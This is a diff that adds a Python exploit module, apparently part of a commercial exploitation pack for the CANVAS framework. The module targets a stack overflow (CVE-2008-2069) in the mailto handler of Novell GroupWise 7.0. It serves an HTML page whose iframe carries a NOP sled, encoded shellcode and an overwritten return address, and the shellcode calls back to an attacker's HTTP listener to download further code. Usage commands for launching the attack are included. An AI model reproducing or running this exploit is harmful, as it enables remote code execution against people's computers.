@@ -1,0 +1,146 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2008
+#
+
+
+import sys
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+
+from exploitutils import *
+from tcpexploit import *
+from httpclientside import httpclientside
+
+import struct
+
+# GUI info
+NAME = "Novell GroupWise mailto URI Handler Stack Overflow"
+
+DESCRIPTION = "Stack Overflow Vulnerability in Novell GroupWise mailto URI Handler"
+DOCUMENTATION = {}
+DOCUMENTATION['Date public'] = "2008.04.28"
+DOCUMENTATION['References'] = "http://www.securityfocus.com/bid/28969"
+DOCUMENTATION['VersionsAffected'] = "Novell GroupWise 7.0"
+DOCUMENTATION["CVE Name"] = "CVE-2008-2069"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2069"
+
+VERSION='1.0'
+
+GTK2_DIALOG='dialog.glade2'
+
+PROPERTY={}
+PROPERTY['TYPE'] = 'Exploit'
+PROPERTY['SITE'] = 'Clientside'
+PROPERTY['ARCH'] = [['Windows']]
+PROPERTY['VERSION'] = ['XP']
+
+NOTES="""
+Usage:
+.\commandlineInterface.py -p 5555 -v 1
+.\exploits\httpserver\httpserver.py -v 9 -O singleexploit:d2sec_gw7 -l 192.168.133.1 -d 5555 -p 80
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0:['Novell GroupWise 7.0'],
+}
+
+class theexploit(tcpexploit,httpclientside):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        httpclientside.__init__(self)
+        self.clientversion = 1
+        self.badstring = "\x00\r\n\t\x20\x27\x22\x3f\x22\x3b\x25\x2c\x5c"
+        self.subesp = 0
+        self.name = NAME 
+        self.filename = "index.html"
+        return
+        
+    def makefile(self):
+        filedata = """
+<HTML> 
+<BODY>
+ 
+<iframe src='mailto:SHELLCODEAAAABBBB' width='320' height='300' scrolling='yes' name='content'></iframe>
+
+</BODY> 
+</HTML>        
+"""
+        tmp = "\x90"*1530
+        buff = tmp[0:10]
+        buff += self.shellcode
+        buff += tmp[10+(len(self.shellcode)):]        				        
+				
+        ret = struct.pack('<L', 0x100118a0)
+        filedata = filedata.replace('SHELLCODE', buff)                
+        filedata = filedata.replace('AAAA', ret)        
+        
+        return filedata
+
+    def makesploit(self, clientheader, clientbody):        
+        from libs.spkproxy import header, body
+        h = header('SERVER')
+        b = body()
+        
+        if clientheader.URL.count(self.filename):
+            self.createShellcode()
+            sploitstring = self.makefile()            
+            b.setBody(sploitstring)
+        else:
+            self.log('Redirecting to self')
+            h.status = '302'
+            h.addHeader('Location', self.filename)
+            h.addHeader('Content-Type', 'binary/octet-stream')
+        return h, b
+
+    def neededListenerTypes(self):
+        from canvasengine import HTTPMOSDEF
+        return [HTTPMOSDEF]
+    
+    def createShellcode(self):                
+        host = self.callback.ip
+        port = self.callback.port
+
+        httpWrapper = ''
+        
+        try:
+            if self.HTTPMOSDEF:
+                print "[!] using HTTP MOSDEF tunneling"
+                print "callback: [%s:%d]\n" % (host, port)
+                sc = shellcodeGenerator.win32()
+                sc.addAttr("findeipnoesp", {"subespval":0x1000})                
+                	
+                if self.useSSL:
+                    ssl = "s"
+                else:
+                    ssl = ""                
+                    
+                sc.addAttr("httpGetShellcode", {"URL":"http%s://%s:%d/w" % (ssl, host, port)})
+                httpWrapper = sc.get()                
+                print "[!] HTTP MOSDEF len: %d bytes" % (len(httpWrapper))
+        except:
+            httpWrapper = ""
+        
+        from encoder import addencoder
+        encoder = chunkedaddencoder.intelchunkedaddencoder()
+        encoder.setbadstring(self.badstring)
+    
+        self.shellcode = encoder.encode(httpWrapper)
+        
+        return self.shellcode
+
+    def run(self):        
+        return 1
+
+if __name__=='__main__':
+    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
